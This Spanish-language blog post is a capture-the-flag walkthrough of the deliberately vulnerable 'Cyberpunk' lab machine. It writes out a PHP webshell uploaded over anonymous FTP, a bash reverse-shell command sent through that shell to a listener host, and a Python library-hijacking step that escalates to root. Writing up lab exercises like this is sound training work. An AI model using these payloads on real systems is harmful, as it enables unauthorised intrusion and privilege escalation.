---
layout: post
title: "Cyberpunk"
date: 2024-06-10 14:05:23
category: sample
vm: hackerlabs
---

<style>
  .post-content {
    color: #51c25be1; /* Cambia el color del texto */
  }
</style>

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Cyberpunk </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://thehackerslabs.com/cyberpunk/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/thehackerlabs/Cyberpunk/host.png){:.margin}

**1\.** Veo hosts activos en la red.

`sudo arp-scan -l`

![img](/notas/public/img/thehackerlabs/Cyberpunk/arp.png){:.margin}

**2\.** Escaneo los puertos y servicios corriendo en la maquina.

`sudo nmap -p- --open -T5 -n -Pn -sCV --min-rate 192.168.1.7`

![img](/notas/public/img/thehackerlabs/Cyberpunk/nmap.png){:.margin}

**3\.** En la web no hay nada mas que una imagen.

`http://192.168.1.7`

![img](/notas/public/img/thehackerlabs/Cyberpunk/80.png){:.margin}

**4\.** Ingreso por ftp como anonymous y veo tres recursos.

`ftp 192.168.1.7`

![img](/notas/public/img/thehackerlabs/Cyberpunk/ftp.png){:.margin}

**5\.** Analizando los recursos.

_5.1- En imagenes encuentro la imagen de la web_

`http://192.168.1.7/images`

![img](/notas/public/img/thehackerlabs/Cyberpunk/80images.png){:.margin}

_5.2- Aqui encuentro una nota_

`http://192.168.1.7/secret.txt`

![img](/notas/public/img/thehackerlabs/Cyberpunk/80secrettxt.png){:.margin}

**6\.** Subiendo un webshell por ftp.

`nano shell.php`

`<?php system($_GET['cmd']);?>`

`put shell.php`

![img](/notas/public/img/thehackerlabs/Cyberpunk/shell.png){:.margin}

**7\.** Obteniendo la conexion por reverse shell.

_7.1- Me pongo en escucha_

`sudo nc -nlvp 443`

![img](/notas/public/img/thehackerlabs/Cyberpunk/nc.png){:.margin}

_7.2- Envio la reverse shell_

`http://192.168.1.7/shell.php?cmd=bash -c "bash -i>%26 /dev/tcp/192.168.1.13/443 0>%261"`

![img](/notas/public/img/thehackerlabs/Cyberpunk/reverseshell.png){:.margin}

_7.1- Recibo la conexion_

![img](/notas/public/img/thehackerlabs/Cyberpunk/ncok.png){:.margin}

**8\.** Encuentro un archivo con codigo brainfuck, lo interpreto con [dcodefr](https://www.dcode.fr/brainfuck-language).

`ls /opt`

`cat /opt/arasaka.txt`

![img](/notas/public/img/thehackerlabs/Cyberpunk/arasakatxt.png){:.margin}
![img](/notas/public/img/thehackerlabs/Cyberpunk/dcodefr.png){:.margin}

**9\.** Tengo usuario arasaka, accedo por ssh con la contraseña interpretada anteriormente.

`cat /etc/passwd | grep bash`

`ssh `

![img](/notas/public/img/thehackerlabs/Cyberpunk/catpasswd.png){:.margin}
![img](/notas/public/img/thehackerlabs/Cyberpunk/ssharasaka.png){:.margin}

**10\.** Revisando archivos.

_10.1- Encuentro python que puedo ejecutarlo como root con el binario python3.11_

`ls -l`

`sudo -l`

![img](/notas/public/img/thehackerlabs/Cyberpunk/sudol.png){:.margin}

_10.2- Veo que el script importa una libreria, pero no especifica la ruta de llamada_

`cat randombase64.py`

`sudo /usr/bin/python3.11 /home/arasaka/randombase64.py`

![img](/notas/public/img/thehackerlabs/Cyberpunk/catrandom.png){:.margin}

**11\.** Creo un script llamado base64 para hacer Python Library Hijacking(_suplantar un libreria_).

`echo -e "import os \nos.system('/bin/bash')" > base64.py`

`cat base64.py`

![img](/notas/public/img/thehackerlabs/Cyberpunk/base64py.png){:.margin}

**12\.** Escalando a root.

`sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py`

![img](/notas/public/img/thehackerlabs/Cyberpunk/root.png){:.margin}

<br>

<span class="finish">_Finalizado._</span>